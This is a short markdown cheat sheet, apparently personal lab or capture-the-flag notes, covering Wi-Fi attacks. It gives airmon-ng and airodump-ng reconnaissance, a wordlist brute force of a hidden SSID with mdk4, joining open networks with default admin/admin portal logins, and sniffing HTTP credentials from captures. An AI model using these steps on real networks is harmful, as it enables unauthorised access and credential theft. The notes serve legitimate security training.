# Main

## Recon
- Clean processes first: ``` sudo airmon-ng check kill ```
### 
- monitor channel has another name 
- 'Station' = mac address of that AP | CH = channel
- ```--band abg```: This specifies that the tool should capture packets on both 2.4 GHz (b) and 5 GHz (a) bands
- ```--manufacturer```: This flag enables logging of manufacturer information for detected devices based on their MAC addresses.
- ```--wps```: This option includes WPS (Wi-Fi Protected Setup) information in the output, which can provide details about supported WPS versions and configuration methods.
1. Check AP/ESSID/Channel/etc..
    ```
    sudo airmon-ng start wlan0
    sudo airodump-ng wlan0mon -w ./scan --manufacturer --wps --band abg 
    -c {channel number for smaller scope}

    ```
2. Crack hidden AP name
    ```
    // prep wordlist | customize it 
    cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ./wifi-rockyou.txt 
    
    // ready crack | Remember turn off airodump first !!! | try few more times
    iwconfig wlan0mon channel 11
    mdk4 wlan0mon p -t {BSSID} -f ./wifi-rockyou.txt
    ```
   
## OPN 
### Direct login with admin/admin
1. create {name}.conf file
   ```
        network={
        ssid="$ESSID"
        key_mgmt=NONE
        scan_ssid=1 
        }
   ```
2. connect with other wifi interface (not wlan2)``` wpa_supplicant -D nl80211 -i wlan2 -c free.conf ```
3. ``` dhclient wlan2 ```
4. (optional) disconnect the connection
   ```
    ps -aux | grep wpa_supplicant

    sudo kill {pid}  // 2nd column
   ```
5. check ap ip ``` arp -a ```

### Sniff user/pwd
1. dump ``` sudo airodump-ng {wifi interface that connected to that AP} -w dump.cap --manufacturer --wps --band abg ``` [e.g. using wlan2 then dump with wlan2]
2. sniff http ``` wireshark dump.cap ```
3. search http if found portal pw